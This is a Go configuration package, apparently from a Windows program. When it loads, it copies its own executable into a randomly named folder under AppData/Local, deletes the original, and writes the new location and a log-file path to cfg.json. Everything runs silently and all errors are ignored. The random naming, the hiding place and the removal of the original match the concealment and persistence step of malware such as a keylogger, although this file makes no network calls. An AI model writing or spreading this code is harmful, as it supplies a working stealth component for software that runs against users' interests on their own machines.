package cfgs

import (
	"encoding/json"
	"os"
	"os/user"

	"github.com/brianvoe/gofakeit"
)

func RandomName() string {
	var name string
	for range 5 {
		name += gofakeit.Letter()
	}
	return name
}

var usrDir = func() string {
	usr, _ := user.Current()
	return usr.HomeDir
}()

var (
	AppData = usrDir + "/AppData/Local/"
	Path    = AppData + "/cfg.json"
)

type Conf struct {
	Name    string
	LogFile string
	BinDir  string
	Folder  string
}

var Settings = Load()

func Make() Conf {
	newName := RandomName()
	newFolder := AppData + newName
	newBinName := newFolder + "/bin.exe"
	if _, err := os.Stat(newFolder); os.IsNotExist(err) {
		os.MkdirAll(newFolder, os.ModePerm)
	}
	CopyBin(newBinName)
	s := Conf{
		Folder:  newFolder,
		LogFile: newFolder + "./out.log",
		Name:    newName,
		BinDir:  newBinName,
	}

	data, _ := json.Marshal(s)
	os.WriteFile(Path, data, os.ModePerm)
	return s
}

func Load() Conf {
	if _, err := os.Stat(Path); os.IsNotExist(err) {
		return Make()
	}
	b, err := os.ReadFile(Path)
	if err != nil {
		return Make()
	}
	s := Conf{}
	json.Unmarshal(b, &s)
	return s
}

func CopyBin(dest string) {
	currentBinDir, _ := os.Executable()
	currentBin, _ := os.ReadFile(currentBinDir)

	err := os.WriteFile(dest, currentBin, os.ModePerm)
	if err != nil {
		return
	}
	os.Remove(currentBinDir)
}
